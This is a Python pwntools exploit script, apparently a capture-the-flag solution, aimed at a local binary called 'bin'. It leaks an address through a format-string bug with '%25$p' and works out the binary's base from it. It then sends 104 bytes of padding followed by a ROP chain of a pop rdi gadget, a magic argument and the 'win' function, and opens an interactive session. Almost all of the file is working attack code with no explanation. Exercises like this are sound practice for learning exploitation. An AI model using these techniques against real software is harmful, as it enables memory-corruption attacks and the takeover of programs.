#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template bin
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'bin')
rop = ROP("bin")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# context.log_level = 'error'   

# for i in range(0, 50):
#     io = process("./bin")
#     io.recvline()
#     payload = '%{}$p'.format(i)
#     io.sendline(payload.encode())
#     print(i, io.recvline())

io = process()
io.recvline()
io.sendline(b'%25$p')

leaked_addr = int(io.recvline().decode(), 16)

print("Binary Leaked address", hex(leaked_addr))
bin_base = (leaked_addr - 0x222) - 0x1000
print("Binary Base address", hex(bin_base))

junk = b'A'*104
pop_rdi = bin_base + rop.find_gadget(['pop rdi', 'ret']).address

arg = 0xdeadbeefcafebabe
win = bin_base + exe.sym['win']

# print("Binary Base address", hex(pop_rdi))
# print("Binary Base address", hex(win))

payload = flat(junk, 
    pop_rdi,
    arg,
    win)

# io = start()
io.recvline()
io.sendline(payload)
io.interactive()

# exploit = payload
# with open('exploit', 'wb') as pay:
#     pay.write(exploit)

